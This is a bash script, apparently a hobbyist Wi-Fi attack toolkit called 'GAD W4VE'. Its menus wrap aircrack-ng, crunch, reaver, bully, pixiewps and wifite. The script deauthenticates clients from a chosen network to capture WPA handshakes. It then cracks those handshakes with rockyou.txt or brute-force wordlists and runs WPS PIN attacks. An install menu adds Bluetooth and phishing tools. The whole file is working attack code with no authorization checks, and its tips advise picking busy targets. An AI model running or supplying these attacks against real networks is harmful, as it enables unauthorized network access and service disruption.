#!/bin/bash

echo -e "\nInstalling Needed Tools"
echo -e "\n"
apt-get install -y aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite
sleep 3
clear

intro() {
    clear
    echo -e "\033[1;32m"
    cat << "EOF"
---------------------------------------------------------------------------------------
 ██████╗  █████╗ ██████╗      ██╗    ██╗██╗  ██╗██╗   ██╗███████╗
██╔════╝ ██╔══██╗██╔══██╗     ██║    ██║██║  ██║██║   ██║██╔════╝
██║  ███╗███████║██║  ██║     ██║ █╗ ██║███████║██║   ██║█████╗  
██║   ██║██╔══██║██║  ██║     ██║███╗██║╚════██║╚██╗ ██╔╝██╔══╝  
╚██████╔╝██║  ██║██████╔╝     ╚███╔███╔╝     ██║ ╚████╔╝ ███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═════╝       ╚══╝╚══╝      ╚═╝  ╚═══╝  ╚══════╝
                                    Coded By Mohamed Gad
---------------------------------------------------------------------------------------                                                                     
(1)Start monitor mode       
(2)Stop monitor mode                        
(3)Scan Networks                            
(4)Getting Handshake(monitor mode needed)   
(5)Install Wireless tools                   
(6)Crack Handshake with rockyou.txt (Handshake needed)
(7)Crack Handshake with wordlist    (Handshake needed)
(8)Crack Handshake without wordlist (Handshake,essid needed)
(9)Create wordlist                                     
(10)WPS Networks attacks (Bssid,monitor mode needed)
(11)Scan for WPS Networks

(0)About Me
(00)Exit
-----------------------------------------------------------------------
EOF
    echo -e "\033[0m"
    echo -e "\nEnter your choice here : !# "
    read var

    case $var in
        1)
            echo -e "\nEnter the interface:(Default(wlan0/wlan1))"
            read interface
            airmon-ng start $interface && airmon-ng check kill
            intro
            ;;
        2)
            echo -e "\nEnter the interface:(Default(wlan0mon/wlan1mon))"
            read interface
            airmon-ng stop $interface && service network-manager restart
            intro
            ;;
        3)
            echo -e "\nEnter the interface:(Default >> (wlan0mon/wlan1mon))"
            read interface
            echo "When Done Press CTRL+c"
            sleep 3
            airodump-ng $interface -M
            sleep 10
            intro
            ;;
        4)
            echo -e "\nEnter the interface:(Default >>(wlan0mon/wlan1mon))"
            read interface
            echo -e "\nWhen Done Press CTRL+c"
            echo -e "\nNote: Under Probe it might be Passwords So copy them to the wordlist file"
            echo -e "\nDon't Attack The Network if its Data is ZERO (you waste your time)"
            echo -e "\nyou Can use 's' to arrange networks"
            sleep 7
            airodump-ng $interface -M
            echo -e "\nEnter the bssid of the target?"
            read bssid
            echo -e "\nEnter the channel of the network?"
            read channel
            echo "Enter the path of the output file ?"
            read path
            echo -e "\nEnter the number of the packets [1-10000] ( 0 for unlimited number)"
            echo "the number of the packets Depends on the Distance Between you and the network"
            read dist
            xterm -e "aireplay-ng -0 $dist -a $bssid $interface" &
            airodump-ng $interface --bssid $bssid -c $channel -w $path
            intro
            ;;
        5)
            wire
            ;;
        0)
            clear
            
NAME="mogad77"
URL="https://www.linkedin.com/in/mogad77/"
OSC_OPEN=$'\e]8;;'"$URL"$'\a'
OSC_CLOSE=$'\e]8;;\a'

cat <<EOF
YOUUUUU...
My Name is Mohamed Gad
linkedin: ${OSC_OPEN}${NAME}${OSC_CLOSE}

CONTACT Me :)

EOF
            exit 0
            ;;
        00)
            exit 0
            ;;
        6)
            if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
                echo -e "\nEnter the path of the handshake file ?"
                read path
                echo -e "\nTo exit Press CTRL +C"
                aircrack-ng $path -w /usr/share/wordlists/rockyou.txt
                sleep 5d
                exit 0
            else
                gzip -d /usr/share/wordlists/rockyou.txt.gz
                echo -e "\nEnter the path of the handshake file ?"
                read path
                echo -e "\nTo exit Press CTRL +C"
                aircrack-ng $path -w /usr/share/wordlists/rockyou.txt
                sleep 5d
                exit 0
            fi
            ;;
        7)
            echo -e "\nEnter the path of the handshake file ?"
            read path
            echo -e "\nEnter the path of the wordlist ?"
            read wordlist
            aircrack-ng $path -w $wordlist
            exit 0
            ;;
        8)
            echo -e "\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') "
            read essid
            echo -e "\nEnter the path of the handshake file ?"
            read path
            echo -e "\nEnter the minimum length of the password (8/64)?"
            read mini
            echo -e "\nEnter the maximum length of the password (8/64)?"
            read max
            cat << "EOF"
---------------------------------------------------------------------------------------
(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
Crack Password Could Take Hours,Days,Weeks,Months to complete
and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
may reach to Hundreds of TeRa Bits so Be patient
EOF
            echo -e "\nEnter your choice here : ?"
            read set
            case $set in
                1) test="abcdefghijklmnopqrstuvwxyz" ;;
                2) test="ABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
                3) test="0123456789" ;;
                4) test="!#\$%/=?{}[]-*:;" ;;
                5) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
                6) test="abcdefghijklmnopqrstuvwxyz0123456789" ;;
                7) test="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
                8) test="!#\$%/=?{}[]-*:;0123456789" ;;
                9) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
                10) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#\$%/=?{}[]-*:;" ;;
                11) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#\$%/=?{}[]-*:;" ;;
                12)
                    echo "Enter you Own Words and numbers"
                    read test
                    ;;
                *)
                    echo -e "\nNot Found"
                    intro
                    ;;
            esac
            crunch $mini $max $test | aircrack-ng $path -e "$essid" -w-
            echo "Copy the Password and Close the tool"
            sleep 3d
            ;;
        9)
            echo -e "\nEnter the minimum length of the password (8/64)?"
            read mini
            echo -e "\nEnter the maximum length of the password (8/64)?"
            read max
            echo -e "\nEnter the path of the output file?"
            read path
            echo -e "\nEnter what you want the password contain ?"
            read password
            crunch $mini $max $password -o $path
            echo "The wordlist in >>>>> $path Named as START"
            ;;
        10)
            clear
            cat << "EOF"
1)Reaver
2)Bully
3)wifite (Recommended)
4)PixieWps

0) Back to Main Menu
EOF
            echo "Choose the kind of the attack(External WIFI Adapter Require) ?"
            read attack
            case $attack in
                1)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    reaver -i $interface -b $bssid -vv
                    intro
                    ;;
                2)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    echo -e "\nEnter the channel of the network ?"
                    read channel
                    bully -b $bssid -c $channel --pixiewps $interface
                    intro
                    ;;
                3)
                    wifite
                    intro
                    ;;
                4)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    reaver -i $interface -b $bssid -K
                    intro
                    ;;
                0)
                    intro
                    ;;
            esac
            ;;
        11)
            echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
            read interface
            airodump-ng -M --wps $interface
            sleep 5
            intro
            ;;
        *)
            echo "Not Found"
            sleep 2
            intro
            ;;
    esac
}

wire() {
    clear
    cat << "EOF"
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to main menu
90) airgeddon
91) wifite v2

0)install all wireless tools
EOF
    read -p "Enter The number of the tool : >>> " w
    case $w in
        1) apt-get update && apt-get install -y aircrack-ng ;;
        90) echo "sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git" ;;
        91) echo "sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git" ;;
        2) apt-get update && apt-get install -y asleap ;;
        3) apt-get update && apt-get install -y bluelog ;;
        4) apt-get update && apt-get install -y bluemaho ;;
        5) apt-get update && apt-get install -y bluepot ;;
        6) apt-get update && apt-get install -y blueranger ;;
        7) apt-get update && apt-get install -y bluesnarfer ;;
        8) apt-get update && apt-get install -y bully ;;
        9) apt-get update && apt-get install -y cowpatty ;;
        10) apt-get update && apt-get install -y crackle ;;
        11) apt-get update && apt-get install -y eapmd5pass ;;
        12) apt-get update && apt-get install -y fern-wifi-cracker ;;
        13) apt-get update && apt-get install -y ghost-phisher ;;
        14) apt-get update && apt-get install -y giskismet ;;
        15) apt-get install -y git && git clone git://git.kali.org/packages/gr-scan.git ;;
        16) apt-get update && apt-get install -y kalibrate-rtl ;;
        17) apt-get update && apt-get install -y killerbee-ng ;;
        18) apt-get update && apt-get install -y kismet ;;
        19) apt-get update && apt-get install -y mdk3 ;;
        20) apt-get update && apt-get install -y mfcuk ;;
        21) apt-get update && apt-get install -y mfoc ;;
        22) apt-get update && apt-get install -y mfterm ;;
        23) apt-get update && apt-get install -y multimon-ng ;;
        24) apt-get update && apt-get install -y pixiewps ;;
        25) apt-get update && apt-get install -y reaver ;;
        26) apt-get update && apt-get install -y redfang ;;
        27) apt-get update && apt-get install -y rtlsdr-scanner ;;
        28) apt-get update && apt-get install -y spooftooph ;;
        29) apt-get update && apt-get install -y wifi-honey ;;
        30) apt-get update && apt-get install -y wifitap ;;
        31) apt-get update && apt-get install -y wifite ;;
        32) intro ;;
        0) apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite ;;
        *) echo "Not Found" ;;
    esac
    wire
}

# Start the script
intro
